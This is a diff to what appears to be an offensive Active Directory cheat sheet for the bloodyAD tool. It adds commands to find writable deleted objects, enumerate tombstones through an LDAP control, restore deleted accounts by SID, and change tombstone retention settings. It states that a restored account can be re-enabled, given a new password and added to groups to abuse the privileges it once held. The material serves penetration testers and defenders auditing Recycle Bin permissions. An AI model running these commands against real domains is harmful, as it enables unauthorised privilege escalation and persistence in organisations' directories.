@@ -54,6 +54,9 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right C
 
 # Show attribute-level detail: which specific attributes are writable per object
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER --detail
+
+# Include deleted/tombstoned objects in the writable results
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --include-del
 ```
 
 ### Object Attributes
@@ -399,6 +402,62 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 # Remove a DNS record after use
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   remove dnsRecord attacker-host $LHOST
+```
+
+## Recycle Bin & Tombstone Reanimation
+
+When the AD Recycle Bin is enabled, deleted objects are preserved as tombstones with most attributes intact. If you can read or write deleted objects, you may be able to restore a previously privileged account or read credentials that were on it before deletion.
+
+### Enumerate Deleted Objects
+
+The LDAP control OID `1.2.840.113556.1.4.2064` unlocks visibility of deleted, tombstoned, and recycled objects in queries.
+
+```bash wrap
+# List all deleted objects (names only)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get search -c 1.2.840.113556.1.4.2064 \
+  --filter '(isDeleted=TRUE)' --attr name
+
+# Read the DACL on the Deleted Objects container to check your permissions
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object 'DC=$DOMAIN,DC=local' --attr ntsecuritydescriptor --resolve-sd
+
+# Check which deleted objects your user can write (requires --include-del)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get writable --include-del
+```
+
+### Restore a Tombstoned Object
+
+Reanimation requires the `Reanimate Tombstones` extended right on the domain naming context, or ownership of the deleted object. Restore by SID (shown in the deleted object's `objectSid` attribute).
+
+```bash wrap
+# Restore a tombstoned object by its SID
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set restore 'S-1-5-21-...-<RID>'
+```
+
+After restoration the account is disabled and has no group memberships. Re-enable it, set a new password, and add it to the relevant groups to abuse any privileges it originally held.
+
+### Retention Settings
+
+These attributes control how long objects remain accessible after deletion.
+
+```bash wrap
+# View current tombstone and deleted object lifetimes
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+  --attr tombstoneLifetime,msDS-DeletedObjectLifetime
+
+# Modify tombstone lifetime (days; requires Domain Admin / write on the DS config object)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+  tombstoneLifetime -v 60
+
+# Modify deleted object lifetime separately (Recycle Bin retention period)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local' \
+  msDS-DeletedObjectLifetime -v 30
 ```
 
 ## Global Flags Reference
